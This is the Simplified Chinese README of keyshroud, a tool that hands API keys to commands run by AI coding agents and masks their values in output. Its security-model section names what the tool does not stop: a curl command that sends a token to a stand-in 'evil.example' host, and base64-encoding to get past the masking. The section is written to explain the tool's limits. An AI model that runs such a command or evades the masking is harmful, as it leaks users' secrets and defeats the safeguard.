<div align="center">

<h1>
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup-dark.svg">
    <img alt="keyshroud" src="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup.svg" height="88">
  </picture>
</h1>

**Agent 能用密钥，但永远看不到密钥。**

keyshroud 让 Claude Code、Codex、Cursor、Cline、OpenCode、Gemini CLI、pi 和 omp 运行需要
API 密钥的命令，而每个密钥值到达模型时都只是 `<redacted:NAME>`。

[![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![Downloads](https://img.shields.io/npm/dm/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](../LICENSE)
[![Node](https://img.shields.io/node/v/keyshroud.svg)](../package.json)

[快速开始](#快速开始) · [密钥存放位置](#密钥存放在哪里) · [支持的 Agent](#支持的-agent) · [最小权限](#最小权限) · [CLI](#cli-参考) · [对比](#与其他方案的比较) · [安全模型](#安全模型) · [常见问题](#常见问题) · [文档](#文档) · [网站](https://keyshroud.dev)

[🇬🇧 English](../README.md) · [🇻🇳 Tiếng Việt](README.vi.md) · [🇨🇳 简体中文](README.zh-CN.md) · [🇯🇵 日本語](README.ja-JP.md)

</div>

<p align="center"><img src="../assets/demo.gif" alt="演示：在一台新机器上，keyshroud add 通过遮蔽的提示符把 GitHub token 存入本地 vault，keyshroud run 在命令输出中遮蔽它，scan 找出泄露到文件里的副本" width="860"></p>

```console
$ keyshroud run --mask -- sh -c 'echo "deploying with $GH_TOKEN"; gh api user -q .login'
deploying with <redacted:GH_TOKEN>
dinhkarate
```

命令拿到的是真实的 token。transcript（以及读取它的模型）看到的只有
`<redacted:GH_TOKEN>`。（由 agent 执行命令时会自动遮蔽；
在人工操作的终端里可以用 `--mask` 强制开启。）

## 为什么需要 keyshroud？

Coding agent 要做实际工作就需要凭据：`gh`、`npm publish`、云厂商的 CLI、webhook、
数据库。常见的交付方式都会泄露：

| 常见做法 | 出问题的地方 |
|---|---|
| 把密钥粘贴到聊天里 | 它留在 transcript、服务商的日志，以及之后的每一个上下文窗口里 |
| 放进 `.env` | agent 调试时会 `cat` 这个文件，或者把它提交进仓库 |
| 使用 vault 的 MCP server | 大多数会把明文值直接返回给模型 |
| 付费使用密钥管理服务 | `op run` 需要 1Password 订阅，而且它只遮蔽你包装过的命令 |

keyshroud 走另一条路：**agent 使用名字，命令拿到值，命令打印出来的任何内容
在模型读到之前都已被遮蔽。**

- **名字，不是值。** agent 看到的是 `GH_TOKEN` 和 `keyshroud://GitHub token`，永远看不到 token。
- **输出遮蔽。** 到达 stdout 或 stderr 的值会变成 `<redacted:GH_TOKEN>`，在你包装过的命令里如此，
  在 Claude Code 和 pi 里，你没有包装的命令也一样。
- **无需配置。** 一个加密的 vault 文件，密钥放在操作系统的钥匙串里。没有账号，没有服务器。
- **你自己的 vault，如果你有的话。** 多台机器可以用 Vaultwarden 或 Bitwarden；HashiCorp Vault、
  OpenBao、Infisical、1Password、AWS、Google Cloud 和 Azure 在它们所在的地方被读取，从不写入。
- **免费。** MIT 许可，没有遥测。

## 快速开始

**环境要求：** Node.js ≥ 18.19。别的什么都不需要。

```bash
npm install -g keyshroud

# 1. 存入一个密钥：在遮蔽的提示符中输入，不会回显。
#    第一个密钥会创建本地 vault。
keyshroud add --env GH_TOKEN --item "GitHub token"

# 2. 使用
keyshroud run -- gh auth status
keyshroud run -- claude          # 启动 agent，所有已绑定的密钥都可用

# 3. 检查全部
keyshroud doctor
```

```console
$ keyshroud add --env GH_TOKEN --item "GitHub token"
Paste secret for GH_TOKEN: ****************************************
keyshroud: created the local vault ~/.config/keyshroud/vault.json; its key is in the macOS keychain (keyshroud-vault-9f2c4e6a1b3d5f70), so programs running as you can open it without asking.
created item=GitHub token env=GH_TOKEN targets=~/.config/keyshroud/env.json verified=yes
```

- **agent 可以启动它。** 没有终端时，`add` 会在你的桌面上打开一个隐藏输入的对话框：
  agent 运行命令，你粘贴值。它从不经过聊天。
- **已经有 `.env`？** `keyshroud import` 把其中的密钥移进 vault，并写出一个
  可以提交的 `.env.refs` 引用文件。
- **或者让 agent 完成安装。** 把这句话粘贴到 Claude Code、Codex、Cursor、OpenCode 或 pi：
  `Read https://keyshroud.dev/install.md and set up keyshroud for me.`

## 你能得到什么

**让值不进入模型**

| | |
|---|---|
| 🙈 **输出遮蔽** | `keyshroud run` 把 stdout 和 stderr 里的每个密钥值替换成 `<redacted:NAME>`，无论退出码是什么，并且绝不让一个被拆成两块的值溜过去。 |
| 🪝 **Agent hook** | pi/omp 的 hook 遮蔽每一个 tool result。Claude Code 的 `PostToolUse` hook 遮蔽每一个成功的结果（Bash、Read、Grep、MCP 等），而 [`keyshroud claude-guard`](#guard-失败的命令也被遮蔽) 在 Bash 命令打印时即遮蔽，失败的命令也一样。 |
| 🔌 **MCP server** | 给没有 shell 的客户端：`secrets_run`、`secrets_list`、`secrets_request`、`vault_status`。没有任何工具返回值。 |
| ⌨️ **粘贴即创建** | 新密钥通过终端里遮蔽的提示符、agent 启动 `add` 时桌面上的隐藏输入对话框，或 pi 里遮蔽的弹窗进入。从不经过聊天。 |
| 🔎 **`scan`** | 找出泄露到你工作区里的 vault 值，在你提交之前。 |

**密钥存放在哪里**

| | |
|---|---|
| 🔐 **本地 vault** | 一个 AES-256-GCM 文件，密钥在 macOS 钥匙串、Linux Secret Service 或 Windows DPAPI 里；没有这些的地方用口令；在 Mac 上想要被询问可以用 Touch ID。 |
| 💾 **备份** | `keyshroud backup` 把本地 vault 复制到一个用独立口令加密的文件；`keyshroud restore` 在任意机器上恢复它并重新绑定名称。 |
| 🔄 **同步** | 同一批密钥需要到达多台机器时，用 $5 VPS 或树莓派上的 Vaultwarden，或者 Bitwarden。 |
| 🏢 **团队的密钥管理系统** | `vault://`、`infisical://`、`op://`、`awssecrets://`、`awsssm://`、`gcpsecrets://`、`azurekeyvault://`：只读来源，和其他密钥一样被注入和遮蔽。 |

**使用它们**

| | |
|---|---|
| 🔗 **可提交的引用** | `.env.refs` 文件里的 `GH_TOKEN=keyshroud://GitHub token`：是名字，不是值，可以安全提交。 |
| 🎯 **项目范围** | 仓库里的 `.keyshroud.json`（`{ "only": ["STRIPE_*", "GH_TOKEN"] }`）把 `run`、`env` 和 agent 在那里拿到的密钥收窄到该项目需要的名字。 |
| 📄 **`inject`** | 把 `{{ keyshroud://… }}` 模板渲染成 `0600` 文件，给无法读取环境变量的工具用（`.npmrc`、kubeconfig）。 |
| 🧾 **审计日志** | `audit.jsonl` 记录使用了哪些*名字*、何时、由哪条命令。从不记录值。 |
| ⚡ **快** | 本地 vault 在毫秒级回答，离线。使用 Vaultwarden 时：每个会话一次批量的 `bw list items`，而不是每个密钥一次 `bw get`（约 3 秒）。 |

## 使用场景

**“Claude Code 老是读我的 `.env`。”** 运行 `keyshroud import` 把值移进 vault，
并写出一个 `.env.refs`，其中的行像 `GH_TOKEN=keyshroud://myapp GH_TOKEN`，然后用
`keyshroud run --env-file .env.refs -- claude` 启动 agent。插件的 hook 会遮蔽任何仍然
溜进 tool result 的内容。

**“一条失败的命令把我的 token 打印进了 transcript。”** 打开
[`keyshroud claude-guard`](#guard-失败的命令也被遮蔽)：Claude Code 里 Bash 命令打印的所有内容
在写出时就被遮蔽，无论命令成功还是失败。

**“我们公司把密钥放在 HashiCorp Vault 里。”** 先运行一次 `keyshroud source add vault --addr https://vault.example.com`，
然后在 `.env.refs` 里写 `DB_PASSWORD=vault://secret/myapp/db#password`。agent 看到的是名字；
值从 Vault 读取，并在输出中被遮蔽。
[OpenBao、Infisical、1Password、AWS、Google Cloud 和 Azure](#团队的密钥管理系统-vault-openbao-infisical-1password-aws-google-cloud-azure) 同理。

**“这个仓库只应该拿到它自己的密钥。”** `keyshroud scope --only 'STRIPE_*,GH_TOKEN'` 会写一个
[`.keyshroud.json`](#最小权限项目自己的名称)：在那里工作的 agent 拿不到你其他项目的 token。

**“我喜欢 `op run`，但不想用 1Password。”** `keyshroud run` 是同一个思路：引用进去，
遮蔽后的输出出来，vault 在你自己的机器上或你自己托管的服务器上。

**“我的 agent 需要添加新密钥。”** 它运行 `keyshroud add` 或调用 `secrets_request`（MCP），
你的桌面上会弹出隐藏输入的对话框；在 pi 里是 `/secret`。你在那里粘贴值。

## 密钥存放在哪里

| | 适合 | 需要 |
|---|---|---|
| [**本地 vault**](#本地-vault)（默认） | 一台机器，无需配置 | 什么都不需要 |
| [**Vaultwarden 或 Bitwarden**](#跨机器同步-vaultwarden-或-bitwarden) | 同一批密钥在多台机器上 | 一个 Bitwarden 账号或你自己的 Vaultwarden，以及 `bw` CLI |
| [**你团队的密钥管理系统**](#团队的密钥管理系统-vault-openbao-infisical-1password-aws-google-cloud-azure) | 公司已经把密钥放在某处 | 你在那里的现有登录 |

它们可以并用：一个引用会指明它的 vault（`keyshroud://…`、`bw://…`、`vault://…`）。

### 本地 vault

`~/.config/keyshroud/vault.json` 保存所有条目，用一个随机的 256 位密钥以 AES-256-GCM 加密。
条目名称也被加密。密钥存放的位置取决于机器：

| 机器 | 密钥 | 解锁 |
|---|---|---|
| macOS | 登录钥匙串 | 不需要 |
| macOS，Touch ID（`KEYSHROUD_VAULT_KEY=secure-enclave`） | 包装成 Secure Enclave 里的一把密钥 | 命令需要密钥时用 Touch ID；一个会话持续 30 分钟 |
| 有桌面钥匙环的 Linux | Secret Service | 不需要 |
| Windows | DPAPI，绑定你的 Windows 账户 | 不需要 |
| Docker、服务器、SSH、没有 systemd 的 Linux | 由口令派生（scrypt） | `keyshroud unlock`；一个会话持续 30 分钟 |

丢失的密钥或忘记的口令无法恢复，`vault.json` 复制到另一台机器上在那里也打不开：
请使用备份。更多见 [docs/local-vault.md](../docs/local-vault.md)。

### 备份与恢复

```bash
keyshroud backup                           # 询问新口令，写出 ./keyshroud-backup-<date>.json
keyshroud restore keyshroud-backup-….json  # 会添加什么；加 --yes 才执行
```

备份是一个文件，用你选择的口令密封，而不是用这台机器的密钥，所以它在哪里都能打开。
`restore` 先打印一份名称计划，本机上值不同的条目会被保留，除非你加 `--replace`，
然后重新绑定变量名：在新机器上，`keyshroud restore FILE --yes` 就是全部迁移。两者都只在终端里运行。
[详情](../docs/local-vault.md#backup-and-restore)。

### 跨机器同步 Vaultwarden 或 Bitwarden

```bash
npm install -g @bitwarden/cli
bw config server https://vault.example.com     # 自建 Vaultwarden；bitwarden.com 跳过
bw login
mkdir -p ~/.config/keyshroud && echo bw > ~/.config/keyshroud/backend   # 新条目存入那里
keyshroud unlock                                # 30 分钟；不保存主密码
```

`run`、各个 hook、MCP server 以及其他一切都以同样的方式通过 Bitwarden CLI 工作。还没有
服务器？[examples/vaultwarden](../examples/vaultwarden#readme) 用 Docker Compose 和 Caddy
从一台空白 VPS 走到 `keyshroud doctor`。会话、免询问解锁、搬回本地 vault，以及一个独立的
agent 账号，都在 [docs/vaultwarden.md](../docs/vaultwarden.md)。

### 团队的密钥管理系统: Vault, OpenBao, Infisical, 1Password, AWS, Google Cloud, Azure

公司通常已经有密钥管理系统。keyshroud 从那里读取，从不写入：
一个引用指明是哪个密钥，没有任何内容被复制进 keyshroud 的 vault。

```bash
keyshroud source add vault --addr https://vault.example.com    # 用 `vault login` 的 token 读取
keyshroud wire --env DB_PASSWORD --item 'vault://secret/myapp/db#password'
keyshroud run --only DB_PASSWORD -- ./migrate.sh
```

```dotenv
# .env.refs：可以安全提交，只有名字
DB_PASSWORD=vault://secret/myapp/db#password
STRIPE_KEY=awssecrets://prod/stripe#api_key
SENTRY_DSN=op://Engineering/Sentry/dsn
```

| 系统 | 引用 | 登录方式 |
|---|---|---|
| HashiCorp Vault、OpenBao（KV v1 和 v2） | `vault://<mount>/<path>#<field>` | `source add vault`：`vault login` 的 token、一个 token，或 AppRole |
| Infisical（云或自建） | `infisical://<project id>/<environment>/[<folder>/]<NAME>` | `source add infisical`：一个 machine identity |
| AWS Secrets Manager、SSM Parameter Store | `awssecrets://<name or ARN>[#<json key>]`、`awsssm://<parameter>` | 你的 `aws` CLI |
| 1Password | `op://<vault>/<item>/<field>` | 你的 `op` CLI |
| Google Cloud Secret Manager | `gcpsecrets://<project>/<secret>[#<json key>]` | 你的 `gcloud` CLI |
| Azure Key Vault | `azurekeyvault://<vault name>/<secret>[#<json key>]` | 你的 `az` CLI |

只读，只用 HTTPS，而且引用永远不能指定服务器，所以克隆来的仓库里的 `.env.refs` 无法把你的
token 发到别处。Vault、OpenBao 和 Infisical 在 CI 里针对真实服务器测试；`op`、`gcloud` 和 `az`
这几条路径针对替身 CLI 测试。每个选项和限制：
[docs/team-secret-managers.md](../docs/team-secret-managers.md)。

## 支持的 Agent

| Agent | 安装 | 提供的功能 |
|---|---|---|
| **Claude Code** | [插件](#claude-code) | SessionStart + PostToolUse 遮蔽 hook、skill；[`claude-guard`](#guard-失败的命令也被遮蔽) 连失败的命令也遮蔽 |
| **pi / omp** | [`pi install npm:keyshroud`](#pi--omp) | 环境变量注入、`tool_result` 遮蔽（失败的调用也包括）、`/secret` |
| **Codex、OpenCode、Gemini CLI、Cursor agent** | [`npx skills add dinhkarate/keyshroud`](#有-shell-的其他-agent) | skill + 输出已遮蔽的 CLI |
| **Claude Desktop、仅聊天的客户端** | [`mcpServers` JSON](#没有-shell-的-mcp-客户端) | 输出已遮蔽的 MCP 工具 |
| **任意 shell 或 CI** | `keyshroud run -- <cmd>` | 环境变量注入 + 输出遮蔽 |

有 shell 的 agent 使用 CLI：它不占用上下文里的工具 schema，而且 `keyshroud run` 无论退出码
如何都遮蔽输出。MCP server 是给无法运行命令的客户端用的。

### Claude Code

```bash
npm install -g keyshroud
```
```text
/plugin marketplace add dinhkarate/keyshroud
/plugin install keyshroud@keyshroud
```

- **SessionStart hook：** 告诉 Claude 存在哪些密钥*名字*。它从不询问密码。
- **PostToolUse hook：** 把任何包含密钥值的成功 tool result 改写为
  `<redacted:NAME>`。
- **Skill：** 教 Claude 使用名字和引用，并通过 `keyshroud run` 运行
  使用密钥的命令。

通过 keyshroud 启动 Claude，让它的 Bash 命令拿到密钥：`keyshroud run -- claude`。
一个 vault 条目也可以是 Claude Code 自己的 API key（`keyshroud claude-setup --item "Anthropic API key"`）。
其余内容在 [docs/claude-code.md](../docs/claude-code.md)。

### Guard: 失败的命令也被遮蔽

```bash
keyshroud claude-guard          # 开启（macOS、Linux）；在新的 Claude Code 会话中生效
keyshroud claude-guard --off
```

Claude Code 无法改写失败命令的输出，所以只靠 hook 会让这些命令不被遮蔽。开启 guard 后，
Claude Code 通过 keyshroud 启动它的 shell：每条 Bash 命令在你真实的 bash 或 zsh 里运行，
它打印的内容在去往 Claude Code 的路上经过一个遮蔽进程。无论命令成功、失败还是被中断，
也无论它是否通过 `keyshroud run` 运行，值都会变成 `<redacted:NAME>`。如果遮蔽进程无法启动，
命令不会运行，而不是以未遮蔽的方式运行。每条命令大约多花 0.2 秒。
[工作原理和限制](../docs/claude-code.md#the-guard-failed-commands-masked-too)。

### pi / omp

```bash
pi install npm:keyshroud
```

扩展在 provider 认证解析之前把已绑定的密钥放进 agent 的环境，遮蔽每一个 tool result
（成功或失败）以及你输入的 `!commands` 的输出，并添加 `/secret`（描述、确认名称、遮蔽粘贴）。
[详情](../docs/agents.md#pi--omp)。

### 有 shell 的其他 agent

Codex、OpenCode、Gemini CLI、Cursor 的 agent 以及其他任何能运行命令的工具：安装
CLI 和 skill，skill 会教 agent 把使用密钥的命令以 `keyshroud run -- …` 运行，并用
`keyshroud add` 存入新密钥。

```bash
npm install -g keyshroud
npx skills add dinhkarate/keyshroud
```

`npx skills` 需要 Node.js 22.20+；在更旧的 Node 上，[复制 CLI 附带的 skill](../docs/agents.md#other-agents-with-a-shell)。

### 没有 shell 的 MCP 客户端

Claude Desktop、仅聊天的客户端，或者你不允许运行命令的 agent：

```json
{ "mcpServers": { "keyshroud": { "command": "keyshroud", "args": ["mcp"] } } }
```

`secrets_run` 在注入密钥的情况下运行命令，返回它的退出码和遮蔽后的输出；
`secrets_list`、`secrets_request` 和 `vault_status` 补全其余部分。没有一个返回值。
[详情](../docs/agents.md#mcp-clients-without-a-shell)。

## 最小权限

默认情况下 `keyshroud run` 把每个已绑定的密钥都给命令。三种收窄方式：

- **按命令：** `keyshroud run --only GH_TOKEN -- gh pr list` 只注入那个名字，并从
  命令继承的内容里移除其他已绑定的名字。
- **按项目：** 一个 scope 文件，见下。
- **按 vault：** 使用 Vaultwarden 时，`keyshroud setup` 给 agent 一个它们自己的账号。

### 最小权限：项目自己的名称

```bash
cd ~/code/shop
keyshroud scope --only 'STRIPE_*,GH_TOKEN'   # 写出 ./.keyshroud.json
keyshroud scope                              # 这里 scope 里有什么，有多少名字不在其中
```

```json
{ "only": ["STRIPE_*", "GH_TOKEN"] }
```

在那个目录及其子目录里，`run`、`env`、`secrets_run`、pi 的 shell，以及 Claude Code 在会话开始时
被告知的名字，都会收窄到 scope 里的名字，scope 之外的名字会被拒绝。文件
只保存名字和模式，所以可以提交。遮蔽不会被收窄：scope 之外的值如果出现在输出里，仍然会被遮蔽。无法作为
scope 读取的文件会让 scope 为空，而不是让所有名字都进入 scope。这是防止误操作的默认值，不是一堵墙：
[docs/project-scope.md](../docs/project-scope.md)。

### 最小权限：独立的 agent 账号

使用 Vaultwarden 或 Bitwarden 时，一个已解锁的会话会打开你的整个 vault。`keyshroud setup --email
you+agent@example.com` 让 keyshroud 在一个专用账号上拥有自己的 `bw` 登录，该账号只保存
agent 需要的密钥，`keyshroud migrate` 把已绑定的条目复制过去。
[docs/vaultwarden.md](../docs/vaultwarden.md#least-privilege-a-separate-agent-account)。

## CLI 参考

```text
Store     keyshroud add --env NAME --item ITEM        store a new secret (masked prompt or dialog)
          keyshroud import [--yes]                    move a .env into the vault, write .env.refs
          keyshroud rotate --item ITEM                replace a value
          keyshroud wire | unwire | list | rm         manage names and items
Use       keyshroud run [--only A,B] [--env-file F] -- <cmd>
          keyshroud inject -i template -o out         render a template into a 0600 file
          keyshroud env                               the names available here
Check     keyshroud doctor | status | scan [paths] | redact < log.txt
Narrow    keyshroud scope [--only A,B_* | --clear]    this directory's .keyshroud.json
Vault     keyshroud unlock | lock | rekey | backup | restore FILE
Sources   keyshroud source [add vault|infisical … | rm …]
Agents    keyshroud mcp | claude-setup | claude-guard [--off] | link-cli
```

| 引用 | 解析为 |
|---|---|
| `keyshroud://GitHub token` | 本地 vault 中保存的值（`/notes` 取它的备注） |
| `bw://GitHub CLI token` | 一个 Vaultwarden 登录的密码（`/username`、`/notes`、`/totp`、`/fields/<name>`） |
| `vault://secret/myapp/db#password` | HashiCorp Vault 或 OpenBao 里一个 KV 密钥的字段 |
| `op://Engineering/Sentry/dsn` | `op read` 为它返回的内容（1Password） |
| `awssecrets://prod/stripe#api_key` | AWS Secrets Manager 里一个 JSON 密钥中的一个键 |

**退出码：** `0` 正常 · `2` 用法错误 · `3` vault 已锁定或不可用 · `4` 密钥缺失或
条目名称有歧义 · `5` 拒绝覆盖已有状态。`run` 以子进程的退出码退出。

每条命令、标志、引用形式和环境变量：[docs/cli.md](../docs/cli.md)。

## 工作原理

```
              ┌──────────────────────────── your machine ─────────────────────────────┐
              │  vault.json ◄── key: keychain · Secret Service · DPAPI · passphrase   │
              │      │                                                                │
              │      ▼                                                                │
 Vaultwarden ◄┼─bw─ keyshroud ── resolves keyshroud:// and bw:// refs ──► command's env   │
 team vault  ◄┼──── (read-only)                                          │            │
              │      └──── redactor ◄──── stdout / stderr ◄──────────────┘            │
              │                │ <redacted:NAME>                                      │
              └────────────────┼──────────────────────────────────────────────────────┘
                               ▼
                  agent transcript / LLM provider
```

1. **绑定。** 密钥按*名字*绑定：`GH_TOKEN → keyshroud://GitHub token`，写在
   `~/.config/keyshroud/env.json` 或项目的 `.env.refs` 里。只写入名字和引用。
2. **解析并注入。** 命令运行时，值从 vault 读出并放进子进程的
   环境变量。从不进入 argv，从不进入 tool result。
3. **遮蔽。** 命令的输出经过一个知道所有值的遮蔽器。Claude Code 的
   hook 和 guard 在那个进程之外运行，改用带密钥的 HMAC 指纹索引，
   因此它们从不持有明文。

完整版本：[docs/how-it-works.md](../docs/how-it-works.md)。

## 与其他方案的比较

给 agent 提供密钥的工具分为四种思路（依据我们 2026-11-15 读到的文档；
欢迎在 issue 里指正）：

| 思路 | 例子 | 模型能看到值吗？ | 你没有包装的命令 | 覆盖范围 |
|---|---|---|---|---|
| **名字进去，遮蔽后的输出出来** | **keyshroud** | 不能：工具输出被遮蔽 | 在 Claude Code（hook，加上针对失败命令的 guard）和 pi/omp 里也被遮蔽；其他 agent 依赖 `keyshroud run` | 命令从环境变量或文件读取的任何密钥 |
| 遮蔽自己子进程的包装器 | 1Password `op run`、`dotenvx run --redact`、`varlock run`、`secretspec run` | 被包装的命令看不到 | 不被遮蔽 | 同上，仅限你包装的命令 |
| vault 的 MCP server | Bitwarden MCP、HashiCorp Vault MCP、Doppler MCP、Infisical MCP（默认） | 能：工具把它返回 | 不适用 | 查询一个密钥 |
| 带占位符的出口代理 | Infisical Agent Vault、OneCLI、`fnox proxy`、1Password for NVIDIA OpenShell、Claude Code 的 `sandbox.credentials` 遮蔽 | 不能：agent 持有的是占位符 | 不适用：真实值从不出现在 shell 里 | 你允许的主机的 HTTP(S) 凭据；需要一个能读取请求的代理 |

keyshroud 把 vault 留在你身边（本地文件、你的 Vaultwarden，或你团队运行的密钥管理系统），
不需要账号，而且免费。对于它能覆盖的凭据，出口代理是对抗恶意或被提示注入的 agent 的更强工具；
keyshroud 覆盖数据库密码、SSH 和签名密钥，以及每个读取环境变量的 CLI。两者可以结合。如果你已经
为 1Password 付费，它的 `op run` 和 Environments 做得很好，而 keyshroud 也能读取 `op://` 引用。

## 安全模型

keyshroud 防范的是**意外泄露**：密钥因为命令打印了它们而进入 transcript、服务商日志、
截图、提交或模型的上下文。

它**不能**让恶意或被提示注入的 agent 变得安全。一个能运行
`keyshroud run -- curl https://evil.example -d "$TOKEN"`，或在打印前把值做 base64 编码的 agent，
可以把它外传。如果这是你的威胁模型，请使用在传输中替换占位符凭据的出口代理，
限制每个会话拿到哪些密钥（`--only`、一个 scope），并保留人工批准命令。

依赖它之前需要知道的：

- **密钥放在操作系统存放密钥的地方。** 在钥匙串模式下，以你的身份运行的任何程序都能打开
  本地 vault，包括 agent。用口令创建它，或在 Mac 上用 Touch ID，以便被询问。
- **遮蔽是精确匹配。** 部分或经过变换的值（`${TOKEN:0:10}`、base64）不会被遮蔽，
  短于 6 个字符的值永远不会被遮蔽。
- **在 Claude Code 里，失败的命令只有在 guard 开启时**，或通过 `keyshroud run` 运行时，才会被遮蔽。
- **Scope 和 guard 是默认值，不是墙。** 以你的身份运行的程序可以改变它们。
- **值永远不会出现在** argv、日志、keyshroud 自己的诊断、MCP 结果、hook 输出或
  审计日志里。这一点有测试。

我们测试的每一项保证和每一个已知限制：[docs/security.md](../docs/security.md)。私下
报告漏洞，见 [SECURITY.md](../SECURITY.md)。

## 常见问题

**一定要用 Vaultwarden 吗？** 不必。默认情况下密钥保存在你机器上的一个加密文件里。
Vaultwarden 或 Bitwarden 是可选的，用于在多台机器上使用同一批密钥。

**密钥会离开我的机器吗？** 使用本地 vault 时不会。keyshroud 没有自己的后端，也
不发送遥测；值进入你所运行命令的环境变量。

**agent 还能使用密钥吗？** 能。命令拿到真实的值；只有模型读到的文本被遮蔽。

**这是沙箱吗？** 不是。它阻止的是*意外*泄露。见[安全模型](#安全模型)。

**Claude Code 不是自己就能做这件事吗？** 部分可以，而且方式不同。Claude Code 可以拒绝对
`.env` 这类文件的读取，它的沙箱可以让命令看到凭据的占位符，并把真实值放到对你允许的主机的
请求上（`sandbox.credentials`，需要开启，仅限沙箱化的 Bash）。它没有密钥存储，也不会改写
工具打印的内容。keyshroud 是那个存储，在各 agent 之间行为一致，并遮蔽输出；两者可以结合。

**为什么不用 `.gitignore` 忽略我的 `.env`？** 那只能阻止提交，挡不住读取。agent 调试时会读
`.env`，而它读到的内容都会发给模型服务商。

**我们公司用 HashiCorp Vault（或 AWS、1Password 等）。我必须把密钥搬走吗？** 不必。
keyshroud 在它们所在的地方读取，从不写入。

**怎么备份本地 vault？** `keyshroud backup`。直接复制 `vault.json` 不是
备份：它只能用它的密钥打开，而密钥留在这台机器的密钥存储里。

**支持 Windows 吗？** 支持，已在 Windows 10 + Node 22 上测试；guard 仅限 macOS 和 Linux。

更多内容，包括 CI、Docker 和从 0.7 升级：[docs/faq.md](../docs/faq.md)。

## 文档

| | |
|---|---|
| [本地 vault](../docs/local-vault.md) | 密钥模式、Touch ID、会话、备份与恢复 |
| [Vaultwarden 或 Bitwarden](../docs/vaultwarden.md) | 同步设置、会话、独立的 agent 账号、搬回本地 vault |
| [团队的密钥管理系统](../docs/team-secret-managers.md) | Vault、OpenBao、Infisical、1Password、AWS、Google Cloud、Azure |
| [项目范围](../docs/project-scope.md) | `.keyshroud.json`：它收窄什么，不收窄什么 |
| [Claude Code](../docs/claude-code.md) | 插件的 hook、`claude-setup`、guard |
| [pi、omp 和其他 agent](../docs/agents.md) | pi/omp 扩展、skill、MCP server |
| [CLI 参考](../docs/cli.md) | 每条命令、引用形式、退出码和环境变量 |
| [工作原理](../docs/how-it-works.md) | 绑定、解锁、解析、注入、遮蔽 |
| [安全模型](../docs/security.md) | 我们测试的保证，以及已知限制 |
| [常见问题](../docs/faq.md) | CI 和 Docker、Windows、升级、故障排查 |
| [Agent 安装指南](https://keyshroud.dev/install.md) | 为 AI agent 编写的分步安装说明 |

docs/ 下的页面均为英文。

## 开发

```bash
npm install
npm run check        # 类型检查 + 测试（替身 bw，无真实 vault）+ 构建
# 在 Docker 里针对真实服务器测试各个 source（Vault、OpenBao、Infisical、一个 AWS 模拟器）：
export $(sh test/live-servers.sh) && node --test test/live.test.ts; sh test/live-servers.sh down
node src/cli.ts doctor   # 从源码运行（Node ≥ 22.18 会剥离类型）
```

见 [CONTRIBUTING.md](../CONTRIBUTING.md)。与运行时无关的核心在 `src/core.ts`（本地 vault 的
文件格式在 `src/vault.ts`，各 source 的协议在 `src/sources.ts`）；agent 集成
在 `extensions/`、`src/mcp.ts` 和 `src/hooks.ts`。

## 致谢

受 [@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password) 启发：它的弹窗
UI 和诊断形态被移植到这里（MIT）。输出遮蔽沿用 1Password 的 `op run`。与 Anthropic、
Bitwarden, Inc.、Vaultwarden 项目或此处提到的任何厂商均无关联；
“Bitwarden” 是 Bitwarden, Inc. 的商标。

## 许可证

[MIT](../LICENSE) © 2026 dinhkarate
